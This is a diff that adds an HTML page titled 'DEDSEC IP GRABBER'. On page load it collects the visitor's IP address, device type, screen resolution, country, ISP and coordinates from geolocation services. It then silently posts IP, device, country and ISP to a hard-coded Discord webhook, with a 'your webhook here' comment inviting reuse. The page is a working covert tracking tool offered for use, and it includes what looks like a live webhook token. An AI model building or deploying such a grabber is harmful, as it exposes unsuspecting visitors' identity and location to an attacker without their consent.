@@ -1,0 +1,160 @@
+<!-- coded by 0xbit -->
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>DEDSEC IP GRABBER</title>
+   
+    <style>
+        body {
+            display: flex;
+            flex-direction: column; 
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            background-image: url('https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/79ed63bb-18f3-4a65-a14d-0b1b09118e09/darmjmf-a112912c-4d2a-41a3-8aa0-3c6b5d77f6d6.gif?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwic3ViIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsImF1ZCI6WyJ1cm46c2VydmljZTpmaWxlLmRvd25sb2FkIl0sIm9iaiI6W1t7InBhdGgiOiIvZi83OWVkNjNiYi0xOGYzLTRhNjUtYTE0ZC0wYjFiMDkxMThlMDkvZGFybWptZi1hMTEyOTEyYy00ZDJhLTQxYTMtOGFhMC0zYzZiNWQ3N2Y2ZDYuZ2lmIn1dXX0.XLfnYGaxGgbI5C_EeNIXX2B93P7GW0AbONSRkMHnG4I');
+            height: 100vh;
+            margin: 0;
+            background-color: transparent;
+            color: rgb(4, 203, 40);
+        }
+
+        .black-card {
+            background-color: black;
+            color: rgb(118, 155, 155);
+            padding: 10px;
+            z-index: 1000;
+            text-align: center;
+            background-color: rgb(23, 27, 27);
+            border-radius: 10px;
+            box-shadow: 0 0 10px 3px #06da97; 
+        }
+
+        h1 {
+            margin-top: 0; 
+            font-size: 80px; 
+            font-weight: 700;
+            text-align: center;
+            line-height: 1.2;
+            color: #fff;
+            text-shadow: 0 0 15px #06da97;
+            letter-spacing: 5px;
+            z-index: 1;
+            position: relative;
+        }
+
+        body {
+            background-color: transparent;
+            color: rgb(255, 255, 255);
+            text-align: right;
+        }
+
+    </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+    <h1> DEDSEC IP GRABBER<span style="font-size: 30%;">.0xbit</span></h1>
+    <div class="black-card">
+        <h2>INFO ABOUT YOU</h2>
+        <p><strong>IPv6 Address:</strong> <span id="ip_address"></span></p>
+        <p><strong>IPv4 Address:</strong> <span id="ipv4Address"></span></p>
+        <p><strong>Device:</strong> <span id="deviceInfo"></span></p>
+        <p><strong>Screen Resolution:</strong> <span id="resolutionInfo"></span></p>
+        <p><strong>Country Name:</strong> <span id="country_name"></span></p>
+        <p><strong>ISP:</strong> <span id="isp"></span></p>
+        <p><strong>Latitude:</strong> <span id="latitude"></span></p>
+        <p><strong>Longitude:</strong> <span id="longitude"></span></p>
+    </div>
+    
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    
+    <script>
+        function detectDevice() {
+            var userAgent = navigator.userAgent.toLowerCase();
+    
+            if (userAgent.includes("mobile")) {
+                return "Smartphone";
+            } else if (userAgent.includes("tablet")) {
+                return "Tablet";
+            } else {
+                return "Laptop or Desktop";
+            }
+        }
+    
+        $(document).ready(function () {
+            var deviceType = detectDevice();
+            document.getElementById("deviceInfo").textContent = deviceType;
+    
+            var screenWidth = window.screen.width;
+            var screenHeight = window.screen.height;
+            document.getElementById("resolutionInfo").textContent = screenWidth + "x" + screenHeight;
+    
+            $.getJSON("https://ipapi.co/json/", function (data) {
+                var ipAddress = data.ip;
+                var countryName = data.country_name;
+                var isp = data.org;
+                var latitude = data.latitude;
+                var longitude = data.longitude;
+
+                $("#ip_address").text(ipAddress);
+                $("#country_name").text(countryName);
+                $("#isp").text(isp);
+                $("#latitude").text(latitude);
+                $("#longitude").text(longitude);
+
+                <!-- your webhook here -->
+                var webhookUrl = "https://discord.com/api/webhooks/1150500721528148018/hppiGQgnefVcky0usk1dL00k4TY0uScRr1PtK1dDie_EC2wTTRzEuBCqj";
+
+                $.get("https://ipv4.icanhazip.com", function (ipv4Address) {
+                    $("#ipv4Address").text(ipv4Address);
+
+                    $.ajax({
+                        type: "POST",
+                        url: webhookUrl,
+                        data: JSON.stringify({
+                            embeds: [
+                                {
+                                    title: 'DEDSEC IP GRABBER',
+                                    thumbnail: {
+                                        url: 'https://i.pinimg.com/originals/e1/59/05/e159053bd6aba58d3fa474fb79b48cb5.gif' 
+                                    },
+                                    fields: [
+                                        {
+                                            name: 'IP Address',
+                                            value: ipv4Address,
+                                            inline: false
+                                        },
+                                        {
+                                            name: 'Device',
+                                            value: deviceType,
+                                            inline: false
+                                        },
+                                        {
+                                            name: 'Country Name',
+                                            value: countryName,
+                                            inline: false
+                                        },
+                                        {
+                                            name: 'ISP',
+                                            value: isp,
+                                            inline: false
+                                        }
+                                    ]
+                                }
+                            ]
+                        }),
+                        contentType: "application/json",
+                        success: function () {
+                            console.log("Data sent to Discord webhook successfully");
+                        },
+                        error: function () {
+                            console.error("Failed to send data to Discord webhook");
+                        }
+                    });
+                });
+            });
+        });
+    </script>
+</body>
+</html>
